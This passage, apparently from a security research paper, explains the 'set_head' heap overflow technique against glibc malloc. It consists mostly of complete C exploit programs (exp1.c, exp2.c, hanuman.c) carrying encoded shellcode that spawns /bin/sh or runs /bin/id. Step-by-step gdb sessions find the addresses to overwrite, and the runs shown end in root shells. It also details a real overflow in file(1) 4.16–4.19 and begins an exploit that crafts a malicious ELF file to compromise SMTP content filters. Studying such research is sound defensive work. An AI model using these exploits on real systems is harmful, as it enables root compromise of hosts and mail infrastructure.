+        fprintf (stderr, "  Using 0x%x instead\n", toploc);
+    } else
+        fprintf (stderr,
+            "--[ Using 0x%x as the top chunk location.\n", toploc);
+
+    // The minus 8 is to take care of the normalization
+    // of the malloc parameter
+    shead->malloc_size = (retloc - toploc - 8);
+
+    // By adding the 8, we are able to sometimes perfectly hit
+    // the return address.  To hit it perfectly, retadr must be a multiple
+    // of 8 + 1 (for the PREV_INUSE flag).
+    shead->topchunk_size = (retadr + shead->malloc_size + 8) | PREV_INUSE;
+
+    if (shead->topchunk_size < shead->malloc_size) {
+        fprintf (stderr,
+            "--[ ERROR: topchunk size is less than malloc size.\n");
+        fprintf (stderr, "--[ Topchunk code will not be triggered\n");
+        exit (1);
+    }
+
+    check_retloc = (toploc + request2size (shead->malloc_size) + 4);
+    if (check_retloc != retloc) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the return location. ", retloc);
+        fprintf (stderr, "Using 0x%x instead\n", check_retloc);
+    } else
+        fprintf (stderr, "--[ Using 0x%x as the return location.\n",
+            retloc);
+
+    check_retadr = ( (shead->topchunk_size & ~(SIZE_BITS))
+        - request2size (shead->malloc_size)) | PREV_INUSE;
+    if (check_retadr != retadr) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the return address.", retadr);
+        fprintf (stderr, " Using 0x%x instead\n", check_retadr);
+    } else
+        fprintf (stderr, "--[ Using 0x%x as the return address.\n",
+            retadr);
+
+    return shead;
+}
+
+
+void
+put_byte (char *ptr, unsigned char data) {
+    *ptr = data;
+}
+
+
+void
+put_longword (char *ptr, unsigned long data) {
+    put_byte (ptr, data);
+    put_byte (ptr + 1, data >> 8);
+    put_byte (ptr + 2, data >> 16);
+    put_byte (ptr + 3, data >> 24);
+}
+
+
+int main (int argc, char *argv[]) {
+
+        char *buffer;
+        char malloc_size_string[20];
+        unsigned long retloc, retadr, toploc;
+        unsigned long topchunk_size, malloc_size;
+        struct sethead *shead;
+
+        if ( argc != 4) {
+                printf ("wrong number of arguments, exiting...\n\n");
+                printf ("%s <retloc> <retadr> <toploc>\n\n", argv[0]);
+                return 1;
+        }
+
+        sscanf (argv[1], "0x%x", &retloc);
+        sscanf (argv[2], "0x%x", &retadr);
+        sscanf (argv[3], "0x%x", &toploc);
+
+        shead = set_head_compute (retloc, retadr, toploc);
+        topchunk_size = shead->topchunk_size;
+        malloc_size = shead->malloc_size;
+
+        buffer = (char *) malloc (1036);
+
+        memset (buffer, 0x90, 1036);
+        put_longword (buffer+1028, topchunk_size);
+        memcpy (buffer+1028-strlen(scode), scode, strlen (scode));
+        buffer[1032]=0x0;
+
+        snprintf (malloc_size_string, 20, "%u", malloc_size);
+        execl ("./scenario1", "scenario1", buffer, malloc_size_string,
+            NULL);
+
+        return 0;
+}
+--------------------------- end of exp1.c ---------------------------------
+
+Here are the steps to find the 3 memory values to use for this exploit.
+
+
+1- The first step is to generate a core dump file from the vulnerable
+program.  You will then have to analyze this core dump to find the proper
+values for your exploit.
+
+To generate the core file, get an approximation of the top chunk location
+by getting the base address of the BSS section.  Normally, the heap will
+start just after the BSS section:
+
+bash$ readelf -S ./scenario1 | grep bss
+  [22] .bss              NOBITS          080495e4 0005e4 000004
+
+
+The BSS section starts at 0x080495e4.  Let's call the exploit the following
+way, and remember to replace 0x080495e4 for the BSS value you have found:
+
+bash$ ./exp1 0xc0c0c0c0 0x080495e4 0x080495e4
+--[ Impossible to use 0x80495e4 as the top chunk location.  Using 0x80495e0
+instead
+--[ Impossible to use 0xc0c0c0c0 as the return location. Using 0xc0c0c0c4
+instead
+--[ Impossible to use 0x80495e4 as the return address. Using 0x80495e1
+instead
+Segmentation fault (core dumped)
+bash$
+
+
+2- Call gdb on that core dump file.
+
+bash$ gdb -q scenario1 core.2212
+Core was generated by `scenario1'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /usr/lib/debug/libc.so.6...done.
+Loaded symbols for /usr/lib/debug/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  _int_malloc (av=0x40140860, bytes=1075054688) at malloc.c:4082
+
+4082          set_head(remainder, remainder_size | PREV_INUSE);
+(gdb)
+
+
+3- The ESI register contains the address of the top chunk.  It might be
+another register for you.
+
+(gdb) info reg esi
+esi            0x8049a38        134519352
+(gdb)
+
+
+4- Start searching before the location of the top chunk to find the NOP
+cushion.  This will be the return address.
+
+0x8049970:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8049980:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8049990:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80499a0:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80499b0:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80499c0:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80499d0:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80499e0:      0x90909090      0x90909090      0x90909090      0xe983c931
+0x80499f0:      0xd9eed9f5      0x5bf42474      0x27137381      0x83b3c0e2
+0x8049a00:      0xf4e2fceb      0x2a98e94d      0x9ea88475      0xdb276b44
+(gdb)
+
+0x8049990 is a valid address.
+
+
+5- To get the return location for your exploit, get a saved EIP from a
+stack frame.
+
+(gdb) frame 2
+#2  0x0804840a in main ()
+(gdb) x $ebp+4
+0xbffff52c:     0x4002980c
+(gdb)
+
+0xbffff52c is the return location.
+
+
+6- You can now call the exploit with the values that you have found.
+
+bash$ ./exp1 0xbffff52c 0x8049990 0x8049a38
+--[ Using 0x8049a38 as the top chunk location.
+--[ Using 0xbffff52c as the return location.
+--[ Impossible to use 0x8049990 as the return address. Using 0x8049991
+instead
+sh-2.05b# exit
+exit
+bash$
+
+
+------[ 6.1.2.1 - Multiple overwrites
+
+This scenario is an example of a situation where it could be possible to
+leverage the set_head() technique to make it write multiple times in
+memory.  Applying this technique will help you improve the reliability of
+the exploit.  It will increase your chances of finding a valid return
+location while you are exploiting the program.
+
+--------------------------- scenario2.c -----------------------------------
+        #include <stdio.h>
+        #include <stdlib.h>
+        #include <unistd.h>
+
+        int main (int argc, char *argv[]) {
+
+                char *buffer1;
+                char *buffer2;
+                unsigned long size;
+
+/* [1] */       buffer1 = (char *) malloc (4096);
+/* [2] */       fgets (buffer1, 4200, stdin);
+
+/* [3] */       do {
+                        size = 0;
+                        scanf ("%u", &size);
+/* [4] */               buffer2 = (char *) malloc (size);
+
+                        /*
+                         * Random code
+                         */
+
+/* [5] */               free (buffer2);
+
+                } while (size != 0);
+
+                return 0;
+        }
+------------------------- end of scenario2.c ------------------------------
+
+Here is a brief description of the important lines in this code:
+
+[1]: A memory region of 4096 bytes is requested.  The top chunk is split
+     and the request is serviced.
+
+[2]: A call to fgets is made.  The destination buffer is not checked to see
+     if it is large enough.  The top chunk can then be overwritten here.
+
+[3]: The program enters a loop.  It reads from 'stdin' until the number '0'
+     is entered.
+
+[4]: A call to malloc is done with 'size' as the parameter.  The loop does
+     not end until size equals '0'.  This gives the attacker the
+     possibility of overwriting the memory multiple times.
+
+[5]: The buffer needs to be freed at the end of the loop.
+
+
+------[ 6.1.2.2 - Exploit
+
+--------------------------- exp2.c ----------------------------------------
+/*
+   Exploit for scenario2.c
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+
+// The following #define are from malloc.c and are used
+// to compute the values for the malloc size and the top chunk size.
+#define PREV_INUSE 0x1
+#define SIZE_BITS  0x7       // PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA
+#define SIZE_SZ (sizeof(size_t))
+#define MALLOC_ALIGNMENT (2 * SIZE_SZ)
+#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
+#define MIN_CHUNK_SIZE 16
+#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \
+    & ~MALLOC_ALIGN_MASK))
+#define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \
+    < MINSIZE)?MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \
+    & ~MALLOC_ALIGN_MASK)
+
+
+struct sethead {
+    unsigned long topchunk_size;
+    unsigned long malloc_size;
+};
+
+
+/* linux_ia32_exec -  CMD=/bin/id Size=68 Encoder=PexFnstenvSub
+http://metasploit.com */
+unsigned char scode[] =
+"\x33\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x4f"
+"\x3d\x1a\x3d\x83\xeb\xfc\xe2\xf4\x25\x36\x42\xa4\x1d\x5b\x72\x10"
+"\x2c\xb4\xfd\x55\x60\x4e\x72\x3d\x27\x12\x78\x54\x21\xb4\xf9\x6f"
+"\xa7\x35\x1a\x3d\x4f\x12\x78\x54\x21\x12\x73\x59\x4f\x6a\x49\xb4"
+"\xae\xf0\x9a\x3d";
+
+
+struct sethead * set_head_compute
+    (unsigned long retloc, unsigned long retadr, unsigned long toploc) {
+
+    unsigned long check_retloc, check_retadr;
+    struct sethead *shead;
+
+    shead = (struct sethead *) malloc (8);
+    if (shead == NULL) {
+        fprintf (stderr,
+            "--[ Could not allocate memory for sethead structure\n");
+        exit (1);
+    }
+
+    if ( (toploc % 8) != 0 ) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the top chunk location.",
+            toploc);
+
+        toploc = toploc - (toploc % 8);
+        fprintf (stderr, "  Using 0x%x instead\n", toploc);
+    } else
+        fprintf (stderr,
+            "--[ Using 0x%x as the top chunk location.\n", toploc);
+
+    // The minus 8 is to take care of the normalization
+    // of the malloc parameter
+    shead->malloc_size = (retloc - toploc - 8);
+
+    // By adding the 8, we are able to sometimes perfectly hit
+    // the return address.  To hit it perfectly, retadr must be a multiple
+    // of 8 + 1 (for the PREV_INUSE flag).
+    shead->topchunk_size = (retadr + shead->malloc_size + 8) | PREV_INUSE;
+
+    if (shead->topchunk_size < shead->malloc_size) {
+        fprintf (stderr,
+            "--[ ERROR: topchunk size is less than malloc size.\n");
+        fprintf (stderr, "--[ Topchunk code will not be triggered\n");
+        exit (1);
+    }
+
+    check_retloc = (toploc + request2size (shead->malloc_size) + 4);
+    if (check_retloc != retloc) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the return location. ", retloc);
+        fprintf (stderr, "Using 0x%x instead\n", check_retloc);
+    } else
+        fprintf (stderr, "--[ Using 0x%x as the return location.\n",
+            retloc);
+
+    check_retadr = ( (shead->topchunk_size & ~(SIZE_BITS))
+        - request2size (shead->malloc_size)) | PREV_INUSE;
+    if (check_retadr != retadr) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the return address.", retadr);
+        fprintf (stderr, " Using 0x%x instead\n", check_retadr);
+    } else
+        fprintf (stderr, "--[ Using 0x%x as the return address.\n",
+            retadr);
+
+    return shead;
+}
+
+
+void
+put_byte (char *ptr, unsigned char data) {
+    *ptr = data;
+}
+
+
+void
+put_longword (char *ptr, unsigned long data) {
+    put_byte (ptr, data);
+    put_byte (ptr + 1, data >> 8);
+    put_byte (ptr + 2, data >> 16);
+    put_byte (ptr + 3, data >> 24);
+}
+
+
+int main (int argc, char *argv[]) {
+
+        char *buffer;
+        char malloc_size_buffer[20];
+        unsigned long retloc, retadr, toploc;
+        unsigned long topchunk_size, malloc_size;
+        struct sethead *shead;
+        int i;
+
+        if ( argc != 4) {
+                printf ("wrong number of arguments, exiting...\n\n");
+                printf ("%s <retloc> <retadr> <toploc>\n\n", argv[0]);
+                return 1;
+        }
+
+        sscanf (argv[1], "0x%x", &retloc);
+        sscanf (argv[2], "0x%x", &retadr);
+        sscanf (argv[3], "0x%x", &toploc);
+
+        shead = set_head_compute (retloc, retadr, toploc);
+        topchunk_size = shead->topchunk_size;
+        free (shead);
+
+        buffer = (char *) malloc (4108);
+        memset (buffer, 0x90, 4108);
+        put_longword (buffer+4100, topchunk_size);
+        memcpy (buffer+4100-strlen(scode), scode, strlen (scode));
+        buffer[4104]=0x0;
+
+        printf ("%s\n", buffer);
+
+        for (i = 0; i < 300; i++) {
+                shead = set_head_compute (retloc, retadr, toploc);
+                topchunk_size = shead->topchunk_size;
+                malloc_size = shead->malloc_size;
+
+                printf ("%u\n", malloc_size);
+
+                retloc = retloc - 8;
+                retadr = retadr + 8;
+
+                free (shead);
+        }
+
+        return 0;
+}
+--------------------------- end of exp2.c ---------------------------------
+
+Here are the steps to find the memory values to use for this exploit.
+
+
+1- The first step is to generate a core dump file from the vulnerable
+program.  You will then have to analyze this core dump to find the proper
+values for your exploit.
+
+To generate the core file, get an approximation of the top chunk location
+by getting the base address of the BSS section.  Normally, the heap will
+start just after the BSS section:
+
+bash$ readelf -S ./scenario2|grep bss
+  [22] .bss              NOBITS          0804964c 00064c 000008
+
+
+The BSS section starts at 0x0804964c.  Let's call the exploit the following
+way, and remember to replace 0x0804964c for the BSS value you have found:
+
+bash$ ./exp2 0xc0c0c0c0 0x0804964c 0x0804964c | ./scenario2
+--[ Impossible to use 0x804964c as the top chunk location.  Using 0x8049648
+instead
+--[ Impossible to use 0xc0c0c0c0 as the return location. Using 0xc0c0c0c4
+instead
+--[ Impossible to use 0x804964c as the return address. Using 0x8049649
+instead
+--[ Impossible to use 0x804964c as the top chunk location.  Using 0x8049648
+instead
+[...]
+--[ Impossible to use 0xc0c0b768 as the return location. Using 0xc0c0b76c
+instead
+--[ Impossible to use 0x8049fa4 as the return address. Using 0x8049fa1
+instead
+Segmentation fault (core dumped)
+bash#
+
+
+2- Call gdb on that core dump file.
+
+bash$ gdb -q scenario2 core.2698
+Core was generated by `./scenario2'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /usr/lib/debug/libc.so.6...done.
+Loaded symbols for /usr/lib/debug/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  _int_malloc (av=0x40140860, bytes=1075054688) at malloc.c:4082
+
+4082          set_head(remainder, remainder_size | PREV_INUSE);
+(gdb)
+
+
+3- The ESI register contains the address of the top chunk.  It might be
+another register for you.
+
+(gdb) info reg esi
+esi            0x804a6a8        134522536
+(gdb)
+
+
+4- For the return address, get a memory address at the beginning of the NOP
+cushion:
+
+0x8049654:      0x00000000      0x00000000      0x00000019      0x4013e698
+0x8049664:      0x4013e698      0x400898a0      0x4013d720      0x00000000
+0x8049674:      0x00000019      0x4013e6a0      0x4013e6a0      0x400899b0
+0x8049684:      0x4013d720      0x00000000      0x00000019      0x4013e6a8
+0x8049694:      0x4013e6a8      0x40089a80      0x4013d720      0x00000000
+0x80496a4:      0x00001009      0x90909090      0x90909090      0x90909090
+0x80496b4:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80496c4:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80496d4:      0x90909090      0x90909090      0x90909090      0x90909090
+
+
+0x80496b4 is a valid address.
+
+
+5- You can now call the exploit with the values that you have found.  The
+return location will be 0xbffffffc, and it will decrement with each write.
+The shellcode in exp2.c executes /bin/id.
+
+bash$ ./exp2 0xbffffffc 0x80496b4 0x804a6a8 | ./scenario2
+--[ Using 0x804a6a8 as the top chunk location.
+--[ Using 0xbffffffc as the return location.
+--[ Impossible to use 0x80496b4 as the return address. Using 0x80496b9
+instead
+[...]
+--[ Using 0xbffff6a4 as the return location.
+--[ Impossible to use 0x804a00c as the return address. Using 0x804a011
+instead
+uid=0(root) gid=0(root) groups=0(root)
+bash$
+
+
+----[ 6.2 - A real case scenario: file(1) utility
+
+The set_head technique was developed during the research of a security hole
+in the UNIX file(1) utility.  This utility is an automatic file content
+type recognition tool found on many UNIX systems.  The versions affected
+are Ian Darwin's version 4.00 to 4.19, maintained by Christos Zoulas.  This
+version is the standard version of file(1) for Linux, *BSD, and other
+systems, maintained by Christos Zoulas.
+
+The main reason why so much energy was put in the development of this
+exploit is mainly because the presence of a vulnerability in this utility
+represents a high security risk for an SMTP content filter.
+
+An SMTP content filter is a system that acts after the SMTP server receives
+email and applies various filtering policies defined by a network
+administrator.  Once the scanning process is finished, the filter decides
+whether the message will be relayed or not.
+
+An SMTP content filter needs to be able to call different kind of programs
+on an incoming email:
+
+        - Dearchivers;
+        - Decoders;
+        - Classifiers;
+        - Antivirus;
+        - and many more ...
+
+The file(1) utility falls under the "classifiers" category.
+
+This attack vector gives a complete new meaning to vulnerabilities that
+were classified as low risk.
+
+The author of this paper is also the maintainer of PIRANA [7], an
+exploitation framework that tests the security of an email content filter.
+By means of a vulnerability database, the content filter to be tested will
+be bombarded by various emails containing a malicious payload intended to
+compromise the computing platform.  PIRANA's goal is to test whether or not
+any vulnerability exists on the content filtering platform.
+
+
+------[ 6.2.1 - The hole
+
+The security vulnerability is in the file_printf() function.  This function
+fills the content of the 'ms->o.buf' buffer with the characteristics of the
+inspected file.  Once this is done, the buffer is printed on the screen,
+showing what type of file was detected.  Here is the vulnerable function:
+
+--[ From file-4.19/src/funcs.c
+
+01 protected int
+02 file_printf(struct magic_set *ms, const char *fmt, ...)
+03 {
+04         va_list ap;
+05         size_t len;
+06         char *buf;
+07
+08         va_start(ap, fmt);
+09         if ((len = vsnprintf(ms->o.ptr, ms->o.len, fmt, ap)) >= ms->
+o.len) {
+10                 va_end(ap);
+11                 if ((buf = realloc(ms->o.buf, len + 1024)) == NULL) {
+12                         file_oomem(ms, len + 1024);
+13                         return -1;
+14                 }
+15                 ms->o.ptr = buf + (ms->o.ptr - ms->o.buf);
+16                 ms->o.buf = buf;
+17                 ms->o.len = ms->o.size - (ms->o.ptr - ms->o.buf);
+18                 ms->o.size = len + 1024;
+19
+20                 va_start(ap, fmt);
+21                 len = vsnprintf(ms->o.ptr, ms->o.len, fmt, ap);
+22         }
+23         ms->o.ptr += len;
+24         ms->o.len -= len;
+25         va_end(ap);
+26         return 0;
+27 }
+
+At first sight, this function seems to take good care of not overflowing
+the 'ms->o.ptr' buffer.  A first copy is done at line 09.  If the
+destination buffer, 'ms->o.buf', is not big enough to receive the character
+string, the memory region is reallocated.
+
+The reallocation is done at line 11, but the new size is not computed
+properly.  Indeed, the function assumes that the buffer should never be
+bigger than 1024 added to the current length of the processed string.
+
+The real problem is at line 21.  The variable 'ms->o.len' represents the
+number of bytes left in 'ms->o.buf'.  The variable 'len', on the other
+hand, represents the  number  of  characters (not  including the trailing
+'\0') which would have been written to the final string if enough space had
+been available.  In the event that the buffer to be printed would be larger
+than 'ms->o.len', 'len' would contain a value greater than 'ms->o.len'.
+Then, at line 24, 'len' would get subtracted from 'ms->o.len'.  'ms->o.len'
+could underflow below 0, and it would become a very big positive integer
+because 'ms->o.len' is of type 'size_t'.  Subsequent vsnprintf() calls
+would then receive a very big length parameter thus rendering any bound
+checking capabilities useless.
+
+
+------[ 6.2.2 - All the pieces fall into place
+
+There is an interesting portion of code in the function donote()/readelf.c.
+There is a call to the vulnerable function, file_printf(), with a
+user-supplied buffer.  By taking advantage of this code, it will be a lot
+simpler to write a successful exploit.  Indeed, it will be possible to
+overwrite the chunk information with arbitrary values.
+
+        --[ From file-4.19/src/readelf.c
+
+          /*
+           * Extract the program name.  It is at
+           * offset 0x7c, and is up to 32-bytes,
+           * including the terminating NUL.
+           */
+          if (file_printf(ms, ", from '%.31s'",
+              &nbuf[doff + 0x7c]) == -1)
+                  return size;
+
+
+After a couple of tries overflowing the header of the next chunk, it was
+clear that the only thing that was overflowable was the wilderness chunk.
+It was not possible to provoke a situation where a chunk that was not
+adjacent to the top chunk could be overflowable with user controllable
+data.
+
+The file utility suffers from this buffer overflow since the 4.00 release
+when the first version of file_printf() was introduced.  A successful
+exploitation was only possible starting from version 4.16.  Indeed, this
+version included a call to malloc with a user controllable variable.  From
+readelf.c:
+
+        --[ From file-4.19/src/readelf.c
+
+          if ((nbuf = malloc((size_t)xsh_size)) == NULL) {
+           file_error(ms, errno, "Cannot allocate memory"
+               " for note");
+           return -1;
+
+This was the missing piece of the puzzle.  Now, every condition is met to
+use the set_head() technique.
+
+
+------[ 6.2.3 - hanuman.c
+
+/*
+ * hanuman.c
+ *
+ * file(1) exploit for version 4.16 to 4.19.
+ * Coded by Jean-Sebastien Guay-Leroux
+ * http://www.guay-leroux.com
+ *
+ */
+
+
+/*
+
+Here are the steps to find the 3 memory values to use for the file(1)
+exploit.
+
+
+1- The first step is to generate a core dump file from file(1).  You will
+then have to analyze this core dump to find the proper values for your
+exploit.
+
+To generate the core file, get an approximation of the top chunk location
+by getting the base address of the BSS section:
+
+bash# readelf -S /usr/bin/file
+
+Section Headers:
+  [Nr] Name              Type            Addr
+  [ 0]                   NULL            00000000
+  [ 1] .interp           PROGBITS        080480f4
+  [...]
+  [22] .bss              NOBITS          0804b1e0
+
+The BSS section starts at 0x0804b1e0.  Let's call the exploit the following
+way, and remember to replace 0x0804b1e0 for the BSS value you have found:
+
+bash# ./hanuman 0xc0c0c0c0 0x0804b1e0 0x0804b1e0 mal
+--[ Using 0x804b1e0 as the top chunk location.
+--[ Impossible to use 0xc0c0c0c0 as the return location. Using 0xc0c0c0c4
+instead
+--[ Impossible to use 0x804b1e0 as the return address. Using 0x804b1e1
+instead
+--[ The file has been written
+bash# file mal
+Segmentation fault (core dumped)
+bash#
+
+
+2- Call gdb on that core dump file.
+
+bash# gdb -q file core.14854
+Core was generated by `file mal'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /usr/local/lib/libmagic.so.1...done.
+Loaded symbols for /usr/local/lib/libmagic.so.1
+Reading symbols from /lib/i686/libc.so.6...done.
+Loaded symbols for /lib/i686/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+Reading symbols from /usr/lib/gconv/ISO8859-1.so...done.
+Loaded symbols for /usr/lib/gconv/ISO8859-1.so
+#0  0x400a3d15 in mallopt () from /lib/i686/libc.so.6
+(gdb)
+
+
+3- The EAX register contains the address of the top chunk.  It might be
+another register for you.
+
+(gdb) info reg eax
+eax            0x80614f8        134616312
+(gdb)
+
+
+4- Start searching from the location of the top chunk to find the NOP
+cushion.  This will be the return address.
+
+0x80614f8:      0xc0c0c0c1      0xb8bc0ee1      0xc0c0c0c1      0xc0c0c0c1
+0x8061508:      0xc0c0c0c1      0xc0c0c0c1      0x73282027      0x616e6769
+0x8061518:      0x2930206c      0x90909000      0x90909090      0x90909090
+0x8061528:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8061538:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8061548:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8061558:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8061568:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8061578:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8061588:      0x90909090      0x90909090      0x90909090      0x90909090
+0x8061598:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80615a8:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80615b8:      0x90909090      0x90909090
+(gdb)
+
+0x8061558 is a valid address.
+
+
+5- To get the return location for your exploit, get a saved EIP from a
+stack frame.
+
+(gdb) frame 3
+#3  0x4001f32e in file_tryelf (ms=0x804bc90, fd=3, buf=0x0, nbytes=8192) at
+readelf.c:1007
+1007                            if (doshn(ms, class, swap, fd,
+(gdb) x $ebp+4
+0xbffff7fc:     0x400172b3
+(gdb)
+
+0xbffff7fc is the return location.
+
+
+6- You can now call the exploit with the values that you have found.
+
+bash# ./new 0xbffff7fc 0x8061558 0x80614f8 mal
+--[ Using 0x80614f8 as the top chunk location.
+--[ Using 0xbffff7fc as the return location.
+--[ Impossible to use 0x8061558 as the return address. Using 0x8061559
+instead
+--[ The file has been written
+bash# file mal
+sh-2.05b#
+
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdint.h>
+
+
+#define DEBUG                           0
+
+
+#define initial_ELF_garbage             75
+//ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically
+// linked
+
+#define initial_netbsd_garbage          22
+//, NetBSD-style, from '
+
+#define post_netbsd_garbage             12
+//' (signal 0)
+
+
+// The following #define are from malloc.c and are used
+// to compute the values for the malloc size and the top chunk size.
+#define PREV_INUSE 0x1
+#define SIZE_BITS  0x7       // PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA
+#define SIZE_SZ (sizeof(size_t))
+#define MALLOC_ALIGNMENT (2 * SIZE_SZ)
+#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
+#define MIN_CHUNK_SIZE 16
+#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \
+    & ~MALLOC_ALIGN_MASK))
+#define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \
+    < MINSIZE)?MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \
+    & ~MALLOC_ALIGN_MASK)
+
+
+// Offsets of the note entries in the file
+#define OFFSET_31_BYTES  2048
+#define OFFSET_N_BYTES   2304
+#define OFFSET_0_BYTES   2560
+#define OFFSET_OVERWRITE 2816
+#define OFFSET_SHELLCODE 4096
+
+
+/* linux_ia32_exec -  CMD=/bin/sh Size=68 Encoder=PexFnstenvSub
+   http://metasploit.com */
+unsigned char scode[] =
+"\x31\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x27"
+"\xe2\xc0\xb3\x83\xeb\xfc\xe2\xf4\x4d\xe9\x98\x2a\x75\x84\xa8\x9e"
+"\x44\x6b\x27\xdb\x08\x91\xa8\xb3\x4f\xcd\xa2\xda\x49\x6b\x23\xe1"
+"\xcf\xea\xc0\xb3\x27\xcd\xa2\xda\x49\xcd\xb3\xdb\x27\xb5\x93\x3a"
+"\xc6\x2f\x40\xb3";
+
+
+struct math {
+    int nnetbsd;
+    int nname;
+};
+
+struct sethead {
+    unsigned long topchunk_size;
+    unsigned long malloc_size;
+};
+
+
+// To be a little more independent, we ripped
+// the following ELF structures from elf.h
+typedef struct
+{
+    unsigned char e_ident[16];
+    uint16_t e_type;
+    uint16_t e_machine;
+    uint32_t e_version;
+    uint32_t e_entry;
+    uint32_t e_phoff;
+    uint32_t e_shoff;
+    uint32_t e_flags;
+    uint16_t e_ehsize;
+    uint16_t e_phentsize;
+    uint16_t e_phnum;
+    uint16_t e_shentsize;
+    uint16_t e_shnum;
+    uint16_t e_shstrndx;
+} Elf32_Ehdr;
+
+typedef struct
+{
+    uint32_t sh_name;
+    uint32_t sh_type;
+    uint32_t sh_flags;
+    uint32_t sh_addr;
+    uint32_t sh_offset;
+    uint32_t sh_size;
+    uint32_t sh_link;
+    uint32_t sh_info;
+    uint32_t sh_addralign;
+    uint32_t sh_entsize;
+} Elf32_Shdr;
+
+typedef struct
+{
+    uint32_t n_namesz;
+    uint32_t n_descsz;
+    uint32_t n_type;
+} Elf32_Nhdr;
+
+
+struct sethead * set_head_compute
+    (unsigned long retloc, unsigned long retadr, unsigned long toploc) {
+
+    unsigned long check_retloc, check_retadr;
+    struct sethead *shead;
+
+    shead = (struct sethead *) malloc (8);
+    if (shead == NULL) {
+        fprintf (stderr,
+            "--[ Could not allocate memory for sethead structure\n");
+        exit (1);
+    }
+
+    if ( (toploc % 8) != 0 ) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the top chunk location.",
+            toploc);
+
+        toploc = toploc - (toploc % 8);
+        fprintf (stderr, "  Using 0x%x instead\n", toploc);
+    } else
+        fprintf (stderr,
+            "--[ Using 0x%x as the top chunk location.\n", toploc);
+
+    // The minus 8 is to take care of the normalization
+    // of the malloc parameter
+    shead->malloc_size = (retloc - toploc - 8);
+
+    // By adding the 8, we are able to sometimes perfectly hit
+    // the return address.  To hit it perfectly, retadr must be a multiple
+    // of 8 + 1 (for the PREV_INUSE flag).
+    shead->topchunk_size = (retadr + shead->malloc_size + 8) | PREV_INUSE;
+
+    if (shead->topchunk_size < shead->malloc_size) {
+        fprintf (stderr,
+            "--[ ERROR: topchunk size is less than malloc size.\n");
+        fprintf (stderr, "--[ Topchunk code will not be triggered\n");
+        exit (1);
+    }
+
+    check_retloc = (toploc + request2size (shead->malloc_size) + 4);
+    if (check_retloc != retloc) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the return location. ", retloc);
+        fprintf (stderr, "Using 0x%x instead\n", check_retloc);
+    } else
+        fprintf (stderr, "--[ Using 0x%x as the return location.\n",
+            retloc);
+
+    check_retadr = ( (shead->topchunk_size & ~(SIZE_BITS))
+        - request2size (shead->malloc_size)) | PREV_INUSE;
+    if (check_retadr != retadr) {
+        fprintf (stderr,
+            "--[ Impossible to use 0x%x as the return address.", retadr);
+        fprintf (stderr, " Using 0x%x instead\n", check_retadr);
+    } else
+        fprintf (stderr, "--[ Using 0x%x as the return address.\n",
+            retadr);
+
+    return shead;
+}
+
+
+/*
+Not CPU friendly :)
+*/
+struct math *
+compute (int offset) {
+
+    int accumulator = 0;
+    int i, j;
+    struct math *math;
+
+    math = (struct math *) malloc (8);
+
+    if (math == NULL) {
+        printf ("--[ Could not allocate memory for math structure\n");
+        exit (1);
+    }
+
+    for (i = 1; i < 100;i++) {
+
+        for (j = 0; j < (i * 31); j++) {
+
+            accumulator = 0;
+            accumulator += initial_ELF_garbage;
+            accumulator += (i * (initial_netbsd_garbage +
+                post_netbsd_garbage));
+            accumulator += initial_netbsd_garbage;
+
+            accumulator += j;
+
+            if (accumulator == offset) {
+                math->nnetbsd = i;
+                math->nname = j;
+
+                return math;
+            }
+        }
+    }
+
+    // Failed to find a value
+    return 0;
+}
+
+
+void
+put_byte (char *ptr, unsigned char data) {
+    *ptr = data;
+}
+
+
+void
+put_longword (char *ptr, unsigned long data) {
+    put_byte (ptr, data);
+    put_byte (ptr + 1, data >> 8);
